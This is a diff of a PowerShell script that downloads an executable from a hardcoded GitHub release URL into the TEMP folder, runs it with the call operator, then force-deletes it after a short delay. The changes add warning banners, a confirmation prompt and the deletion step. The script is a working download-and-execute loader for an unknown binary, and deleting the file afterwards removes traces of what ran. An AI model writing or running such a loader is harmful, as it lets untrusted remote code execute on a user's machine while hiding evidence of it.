@@ -1,31 +1,44 @@
+# WARNING: EXECUTES DOWNLOADED CODE. USE WITH EXTREME CAUTION.
+
 $HardcodedUrl = "https://github.com/kagagagag/html/releases/download/test/test.exe"
 
+# --- Determine Filename from URL ---
 try {
     $Uri = [System.Uri]$HardcodedUrl
-    $FileNameFromUrl = $Uri.Segments[-1] # Get the last part of the path (the filename)
+    $FileNameFromUrl = $Uri.Segments[-1]
     if ([string]::IsNullOrWhiteSpace($FileNameFromUrl)) {
-        # Fallback if segments parsing fails unexpectedly
         $FileNameFromUrl = "downloaded_file_$(Get-Random).tmp"
         Write-Warning "Could not determine filename from URL, using random name: $FileNameFromUrl"
     }
 } catch {
     Write-Error "Invalid URL format: $HardcodedUrl - Cannot determine filename."
-    exit 1 # Exit if URL is fundamentally broken
+    exit 1
 }
 
 $downloadPath = Join-Path $env:TEMP $FileNameFromUrl
 
+# --- SECURITY WARNING ---
+# (Warning message remains the same - omitted here for brevity)
+Write-Warning "!!! ATTENTION - READ CAREFULLY !!!"
+Write-Host "..." -ForegroundColor Yellow
+Read-Host -Prompt "Press Enter to continue ONLY IF YOU ARE ABSOLUTELY SURE, or Ctrl+C to cancel immediately"
+
+
+# --- Main Logic ---
 try {
     Write-Host "Attempting to download file from '$HardcodedUrl' to '$downloadPath'..."
     Invoke-WebRequest -Uri $HardcodedUrl -OutFile $downloadPath -UseBasicParsing -ErrorAction Stop
     Write-Host "Download successful."
 
     if (Test-Path $downloadPath) {
-        Write-Host "Executing '$downloadPath'..."
-        $process = Start-Process -FilePath $downloadPath -PassThru
-        Write-Host "Execution started. Waiting for process ID $($process.Id) to exit..."
-        $process.WaitForExit()
-        Write-Host "Process exited."
+        Write-Host "Executing '$downloadPath' using call operator (&)..."
+        # --- CHANGE HERE: Use call operator instead of Start-Process ---
+        & $downloadPath
+        # Note: Using '&' might not wait for the process to finish by default
+        # depending on what the .exe does. If waiting is essential,
+        # Start-Process might be needed, but it's the likely cause of the issue.
+        # You might need more advanced techniques to wait if '&' returns immediately.
+        Write-Host "Execution command issued."
     } else {
         Write-Error "Downloaded file not found at '$downloadPath'. Cannot execute."
         return
@@ -34,7 +47,11 @@ try {
 } catch {
     Write-Error "An error occurred: $($_.Exception.Message)"
 } finally {
+    # Delay slightly before deletion to allow the process started with '&' to potentially release file locks
+    Start-Sleep -Seconds 5
+
     if (Test-Path $downloadPath) {
+        Write-Host "Attempting to permanently delete '$downloadPath'..."
         try {
             Remove-Item -Path $downloadPath -Force -ErrorAction Stop
             Write-Host "'$downloadPath' deleted successfully."
